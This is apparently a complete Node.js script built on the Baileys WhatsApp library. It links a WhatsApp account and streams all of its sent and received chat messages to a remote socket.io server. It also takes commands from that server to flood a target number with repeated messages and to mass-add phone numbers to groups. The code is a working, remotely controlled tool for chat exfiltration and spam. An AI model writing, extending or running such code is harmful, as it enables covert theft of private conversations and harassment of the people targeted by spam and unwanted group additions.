const io = require('socket.io-client');
const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason, 
    fetchLatestBaileysVersion 
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const readline = require('readline');

const SERVER = 'https://ai-proxy-production-59b3.up.railway.app';
const socket = io(SERVER);
const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
const q = (t) => new Promise(r => rl.question(t, r));

let sock, myPhone;

async function start() {
    const { state, saveCreds } = await useMultiFileAuthState('auth_info_baileys');
    const { version } = await fetchLatestBaileysVersion();

    sock = makeWASocket({
        version,
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: 'silent' }),
        browser: ["Ubuntu", "Chrome", "20.0.0"],
        syncFullHistory: false,
        msgRetryCounterCache: new Map(),
        defaultQueryTimeoutMs: undefined
    });

    if (!sock.authState.creds.registered) {
        setTimeout(async () => {
            console.log("\n⚠️ أنت غير متصل حالياً.");
            const phoneNumber = await q('📱 أدخل رقم هاتفك بصيغة الدولة (مثال: 201012345678): ');
            
            try {
                const cleanPhone = phoneNumber.replace(/\D/g, ''); 
                const code = await sock.requestPairingCode(cleanPhone);
                console.log(`\n🔑 كود الربط الخاص بك هو: ${code.match(/.{1,4}/g).join('-')}`);
                console.log('يرجى فتح الواتساب -> الأجهزة المرتبطة -> ربط جهاز -> "الربط باستخدام رقم الهاتف بدلاً من ذلك" وإدخال الكود أعلاه.\n');
                myPhone = cleanPhone;
            } catch (error) {
                console.error('❌ حدث خطأ:', error.message);
                process.exit(1);
            }
        }, 2000);
    }

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        
        if (connection === 'close') {
            const shouldReconnect = (lastDisconnect.error)?.output?.statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) {
                console.log('🔄 جاري إعادة الاتصال...');
                start();
            } else {
                console.log('❌ تم تسجيل الخروج.');
                process.exit(1);
            }
        } 
        else if (connection === 'open') {
            if (!myPhone) myPhone = sock.user?.id?.split(':')[0] || 'unknown';
            console.log('\n✅ تم اتصال الواتساب بنجاح!');
            console.log('📱 ' + myPhone);
            console.log('📡 جاري إرسال الشات للسيرفر...\n');
            socket.emit('register', { phone: myPhone });
        }
    });

    // إرسال الرسايل
    sock.ev.on('messages.upsert', async (m) => {
        const msg = m.messages[0];
        if (!msg.message || !myPhone) return;

        const from = msg.key.remoteJid;
        const text = msg.message.conversation || msg.message.extendedTextMessage?.text;
        if (!text) return;

        const type = msg.key.fromMe ? 'out' : 'in';
        const sender = from.split('@')[0];

        socket.emit('chat', {
            phone: myPhone,
            from: sender,
            text: text,
            type: type,
            time: new Date().toISOString()
        });

        console.log(`${type === 'out' ? '📤' : '📥'} ${sender}: ${text.substring(0, 50)}`);
    });
}

start();

// استقبال أوامر السبام من الصفحة
socket.on('spam-command', async (data) => {
    const { target, message, count } = data;
    console.log('\n🚀 SPAM: ' + count + ' → ' + target);
    
    const jid = target.includes('@s.whatsapp.net') ? target : target + '@s.whatsapp.net';
    
    for (let i = 1; i <= count; i++) {
        try {
            await sock.sendMessage(jid, { text: message });
            console.log('[' + i + '/' + count + '] ✅');
        } catch(e) {
            console.log('[' + i + '/' + count + '] ❌');
        }
        await new Promise(r => setTimeout(r, 50));
    }
    
    console.log('✅ Spam done!\n');
});

// استقبال أوامر إضافة الأعضاء
socket.on('add-command', async (data) => {
    const { groupId, numbers } = data;
    console.log('\n👥 Adding ' + numbers.length + ' members to ' + groupId);
    
    for (const num of numbers) {
        const jid = num.includes('@s.whatsapp.net') ? num : num + '@s.whatsapp.net';
        try {
            await sock.groupParticipantsUpdate(groupId, [jid], "add");
            console.log('✅ ' + num);
        } catch(e) {
            console.log('❌ ' + num);
        }
        await new Promise(r => setTimeout(r, 200));
    }
    
    console.log('✅ Done!\n');
});
